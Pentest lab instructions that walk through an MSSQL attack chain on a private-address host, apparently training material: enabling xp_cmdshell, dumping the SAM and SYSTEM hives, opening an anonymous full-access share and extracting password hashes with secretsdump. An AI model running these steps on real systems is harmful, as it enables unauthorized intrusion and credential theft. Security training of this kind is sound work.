# Chapter 6 Instructions

## Using Metasploit to Verify MSSQL Credentials

1. Launch Metasploit:

   ```bash
   msfconsole
   ```

2. Verify MSSQL credentials:

   ```metasploit
   use auxiliary/scanner/mssql/mssql_login
   set rhosts 10.0.10.201
   set username sa
   set password Password1
   run
   ```

   This step checks if the provided MSSQL credentials (`username: sa`, `password: Password1`) are valid for accessing the server at `10.0.10.201`. You should see a message indicating that the auxiliary module execution completed successfully.

## Checking xp_cmdshell Availability

1. Check if `xp_cmdshell` is enabled:

   ```metasploit
   use auxiliary/admin/mssql/mssql_enum
   set rhosts 10.0.10.201
   set username sa
   set password Password1
   run
   ```

   This command checks whether `xp_cmdshell` is enabled on the MSSQL server. The expected output indicates that `xp_cmdshell` is not enabled.

## Enabling xp_cmdshell

After installing `mssql-cli` (see `mssqli.md` for installation instructions), and ensuring it's connected:

1. Enable advanced options:

   ```sql
   sp_configure 'show advanced options', '1';
   RECONFIGURE;
   ```

2. Enable `xp_cmdshell`:

   ```sql
   sp_configure 'xp_cmdshell', '1';
   RECONFIGURE;
   ```

3. Test `xp_cmdshell`:

   - Check the current user:

     ```sql
     exec master..xp_cmdshell 'whoami';
     ```

   - List members of the administrators group:

     ```sql
     exec master..xp_cmdshell 'net localgroup administrators';
     ```

## Saving Registry Hives

1. Use `reg.exe` to save registry hive copies:

   ```sql
   exec master..xp_cmdshell 'reg.exe save HKLM\SAM c:\windows\temp\sam';
   exec master..xp_cmdshell 'reg.exe save HKLM\SYSTEM c:\windows\temp\system';
   ```

## Listing Directory Contents

1. List the contents of the `c:\windows\temp` directory:

   ```sql
   exec master..xp_cmdshell 'dir c:\windows\temp';
   ```

## Preparing the Network Share

1. Adjust permissions and create a network share using `mssql-cli`:

   ```sql
   exec master..xp_cmdshell 'cacls c:\windows\temp\sam /E /G "Everyone":F';
   exec master..xp_cmdshell 'net share pentest=c:\windows\temp /GRANT:"Anonymous Logon,FULL" /GRANT:"Everyone,FULL"';
   ```

## Accessing the Network Share

1. Use `smbclient` to access the share:

   ```bash
   smbclient \\\\10.0.10.201\\pentest -U ""
   ```

   If the above doesn't work, try using the Administrator account:

   ```bash
   smbclient \\\\10.0.10.201\\pentest -U Administrator
   ```

## Dumping Hashes

1. Clone the Impacket repository and navigate to its directory:

   ```bash
   git clone https://github.com/SecureAuthCorp/impacket.git
   cd impacket
   ```

2. Copy the `sam` and `system` files from the `c:\windows\temp` directory into the `impacket/examples/` folder.

3. Dump the hashes:

   ```bash
   python3 secretsdump.py -sam sam -system sys LOCAL > output.txt
   ```

   This command extracts hashes from the `sam` and `system` files, saving the output to `output.txt`.
